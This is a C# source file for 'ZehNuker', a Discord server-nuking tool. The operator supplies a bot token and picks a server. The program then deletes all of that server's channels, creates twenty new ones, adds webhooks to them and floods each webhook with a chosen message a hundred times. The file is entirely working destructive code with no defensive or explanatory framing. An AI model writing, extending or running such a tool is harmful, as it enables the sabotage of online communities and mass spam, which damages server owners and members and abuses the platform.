
class Program
{

  public static readonly int MESSAGES_PER_WEBHOOK = 100;
  public static readonly int CHANNELS_TO_CREATE = 20;

  public static async Task Main()
  {
    try
    {
      await Init();
    }
    catch (System.Exception ex)
    {
      Console.WriteLine(ex.Message);
      Exit();
    }
  }

  public static async Task Init()
  {
    Console.Title = "ZehNuker";
    Console.Clear();
    Console.Write("[?] Please enter your Discord Bot Token: ");

    string? token = Console.ReadLine();

    if (token == null)
    {
      Console.WriteLine("[!] Discord Bot Token was not entered");
      Exit();
      return;
    }

    DiscordBotUser? user = await Discord.GetInfo(token);

    if (user == null)
    {
      Console.WriteLine("[!] The entered token is invalid or unauthorized.");
      Exit();
      return;
    }

    Console.WriteLine($"[!] Successfully logged in as {user.username}#{user.discriminator} (ID: {user.id})");
    Console.Title = $"ZehNuker - Logged in as {user.username}";

    Console.WriteLine("[!] Retrieving bot's guilds ...");
    List<DiscordGuild>? guilds = await Discord.GetGuilds(token);

    if (guilds == null || guilds.Count <= 0)
    {
      Console.WriteLine("[!] The bot is not a member of any guilds.");
      Exit();
      return;
    }
    Console.WriteLine("[!] The bot is a member of the following guilds:");
    for (int i = 0; i < guilds.Count; i++)
    {
      var guild = guilds[i];
      Console.WriteLine($"[{i}] >> {guild.name} - {guild.id} - Admin: {Util.BotIsAdmin(guild.permissions)}");
    }

    Console.Write("[?] Select a guild by number or enter its Guild ID from the list above: ");
    string? guildId = Console.ReadLine();

    if (string.IsNullOrWhiteSpace(guildId))
    {
      Console.WriteLine("[!] Invalid Guild ID entered or the bot is not a member of the specified guild.");
      Exit();
      return;
    }

    DiscordGuild? selectedGuild = null;

    if (int.TryParse(guildId, out int index))
    {
      if (index >= 0 && index < guilds.Count)
      {
        selectedGuild = guilds[index];
      }
      else
      {
        Console.WriteLine("[!] The selected index is out of range, Guild not found.");
        Exit();
        return;
      }
    }
    else
    {
      selectedGuild = guilds.Find(g => g.id == guildId);
      if (selectedGuild == null)
      {
        Console.WriteLine("[!] Guild ID not found in the list.");
        Exit();
        return;
      }
    }

    guildId = selectedGuild.id;

    if (string.IsNullOrWhiteSpace(guildId))
    {
      Console.WriteLine("[!] Guild ID null");
      Exit();
      return;
    }

    Console.Write("[?] Please enter the message you want to spam: ");
    string? content = Console.ReadLine();

    if (content == null || content.Length <= 0 || content.Length >= 2000)
    {
      Console.WriteLine("[!] Message content is missing or exceeds the maximum length of 2000 characters.");
      Exit();
      return;
    }

    List<DiscordChannel>? channels = await Discord.GetChannels(token, guildId);

    if (channels != null && channels.Count >= 1)
    {
      foreach (DiscordChannel channelToDelete in channels)
      {
        _ = Task.Run(async () =>
       {
         if (channelToDelete.id != null)
         {
           await Task.Delay(300);
           await Discord.DeleteChannel(token, channelToDelete.id);
         }
       });
      }
    }
    else
    {
      Console.WriteLine("[!] No available channels were found in the selected guild to delete (Skipping)");
    }

    await Task.Delay(1500);

    List<DiscordChannel> createdChannels = [];
    List<Task> creationTasks = [];

    for (int i = 0; i < CHANNELS_TO_CREATE; i++)
    {
      var task = Task.Run(async () =>
      {
        await Task.Delay(300);
        DiscordChannel? new_channel = await Discord.CreateChannel(token, guildId);
        if (new_channel != null && new_channel.id != null)
        {
          lock (createdChannels)
          {
            createdChannels.Add(new_channel);
          }
        }
      });
      creationTasks.Add(task);
    }

    await Task.WhenAll(creationTasks);

    await Task.Delay(2000);

    List<DiscordWebhook> webhooks = [];

    foreach (DiscordChannel channel in createdChannels)
    {
      _ = Task.Run(async () =>
      {
        if (channel != null && !string.IsNullOrWhiteSpace(channel.id))
        {
          DiscordWebhook? webhook = await Discord.CreateWebhookForChannel(token, channel.id);
          if (webhook != null && !string.IsNullOrWhiteSpace(webhook.url))
          {
            webhooks.Add(webhook);
          }
        }
      });
    }

    await Task.Delay(1500);

    foreach (DiscordWebhook webhook in webhooks)
    {
      if (webhook != null && webhook.url != null)
      {
        _ = Task.Run(async () =>
      {
        for (int i = 0; i < MESSAGES_PER_WEBHOOK; i++)
        {
          await Discord.SendMessageToWebhook(webhook.url, content);
        }
      });
      }
    }

    Console.ReadLine();
  }



  public static void Exit()
  {
    Console.WriteLine("\n[!] Exiting Program in 10 seconds ...");
    Thread.Sleep(10000);
    Environment.Exit(0);
  }
}